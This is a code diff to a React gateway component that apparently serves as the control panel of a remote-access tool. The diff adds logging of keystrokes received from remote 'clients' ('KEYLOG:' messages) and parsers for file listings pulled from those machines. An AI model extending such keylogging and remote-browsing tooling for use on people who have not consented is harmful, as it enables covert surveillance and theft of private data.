@@ -211,6 +211,7 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
     if (text.startsWith('KEYLOG: ')) {
       const char = text.substring(8);
       const entry = { text: char, timestamp: Date.now() };
+      console.log(`[FE-KEYLOG] Received '${char}' at ${Date.now()}`);
       return { ...client, keylogs: [...client.keylogs, entry] };
     }
 
@@ -255,7 +256,53 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
       return { ...client, apps };
     }
 
-    // File list
+    // File list (Compact Format: name|path|size|time|dir|hidden)
+    if (text.startsWith('DATA:FILES_COMPACT:')) {
+      const payload = text.substring(19);
+      if (!payload) return { ...client, files: [] };
+
+      const files: FileEntry[] = payload.split('\n').filter(Boolean).map(line => {
+        const [name, path, size, time, isDir, isHidden] = line.split('|');
+        return {
+          name,
+          path,
+          size: parseInt(size, 10) || 0,
+          type: (isDir === '1') ? 'folder' : 'file',
+          extension: name.includes('.') ? name.split('.').pop() : undefined
+        };
+      });
+
+      const newCache = new Map(client.filesCache);
+      newCache.set(client.currentPath, files);
+      return { ...client, files, filesCache: newCache };
+    }
+
+    // Prefetched subdirectory file list (Compact Format: path\nfiles...)
+    if (text.startsWith('DATA:FILES_PREFETCH_COMPACT:')) {
+      const payload = text.substring(28);
+      if (!payload) return client;
+
+      const lines = payload.split('\n').filter(Boolean);
+      if (lines.length === 0) return client;
+
+      const prefetchPath = lines[0];
+      const prefetchedFiles: FileEntry[] = lines.slice(1).map(line => {
+        const [name, path, size, time, isDir, isHidden] = line.split('|');
+        return {
+          name,
+          path,
+          size: parseInt(size, 10) || 0,
+          type: (isDir === '1') ? 'folder' : 'file',
+          extension: name.includes('.') ? name.split('.').pop() : undefined
+        };
+      });
+
+      const newCache = new Map(client.filesCache);
+      newCache.set(prefetchPath, prefetchedFiles);
+      return { ...client, filesCache: newCache };
+    }
+
+    // File list (Legacy JSON)
     if (text.startsWith('DATA:FILES:')) {
       console.log('[FILES] Received at:', Date.now(), 'length:', text.length);
       try {
@@ -415,7 +462,7 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
           if (wsClientRef.current?.isConnected()) {
             wsClientRef.current.sendText(0, 'ping');
           }
-        }, 5000);
+        }, 5000); // 5 seconds for stable connection
         // Initial ping
         wsClientRef.current?.sendText(0, 'ping');
       },
